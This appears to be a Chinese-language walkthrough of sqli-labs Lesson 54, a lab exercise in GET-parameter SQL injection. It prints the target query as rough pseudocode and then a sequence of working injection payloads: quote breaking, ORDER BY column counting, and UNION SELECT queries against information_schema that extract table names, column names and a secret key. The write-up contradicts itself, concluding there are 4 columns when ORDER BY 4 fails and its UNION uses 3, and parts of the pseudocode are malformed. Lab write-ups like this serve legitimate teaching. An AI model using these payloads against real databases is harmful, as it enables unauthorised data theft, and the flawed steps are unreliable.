### Lesson-54

该题为单引号get型注入，利用方式包括联合查询、布尔盲注、时间盲注

```
id\=1'
```

![](../Images/7ccd9ac83035d70f2c2707a795d4bb62.png)

目标SQL语句如下：

```
if ($\_POST\['reset'\]):
    setcookie('challenge', ' ', time() \- 3600000);
else:
    if ($\_COOKIE\['challenge'\]):
        $sessid\=$\_COOKIE\['challenge'\];
    else:
        $expire \= time()+60\*60\*24\*30;
         $hash \= data($table,$col);
         setcookie("challenge", $hash, $expire);
        
    if ($\_GET\['id'\]):
       $id\=$\_GET\['id'\];
       next\_tryy() \>= ($times+1)
       $sql\="SELECT \* FROM security.users WHERE id='$id' LIMIT 0,1";
    if true:
       输出查询信息;
    else:
       输出报错;
```

**注意：该题对查询次数进行了限制，我们需要在十次查询以内拿到 key，由于报错不输出 mysql 错误信息，因此不能使用报错注入。**

使用联合查询判断注入点

```
id\=1'--+
```

![](../Images/38fb6ec5a63e8b8be9141fb06f89c3de.png)

判断字段数

```
id\=1' order by 3--+ //返回正确
id=1' order by 4\--+ //返回异常
```

![](../Images/cdcf989bd3a2c2543dce088d7198e806.png)

由此可判断字段数为4，通过 union select 查看回显位置

```
id\=-1' union select 1,2,3--+
```

![](../Images/a2dcbf1bac50d67f8415354479f420a7.png)

查询表名

```
id\=-1' union select 1,2,group\_concat(table\_name) from information\_schema.tables where table\_schema=database()--+
```

![](../Images/0667bd9705b0288f59c570ecb40d6055.png)

查询列名

```
id\=-1' union select 1,2,group\_concat(column\_name) from information\_schema.columns where table\_name='6r90s8mprd'--+
```

![](../Images/981ccc521ec49ee1c5963443a955da40.png)

查询关键信息

```
id\=-1' union select 1,2,group\_concat(secret\_OB1G) from 6r90s8mprd--+
```

![](../Images/6c9117b309faf010ea3c15b05c638877.png)

成功拿到 key 值：lqZTCWPcYokbGQP8WQdImRzj

**需要注意的是每次表名和列名都会不同，及时修改可以查询到具体信息**
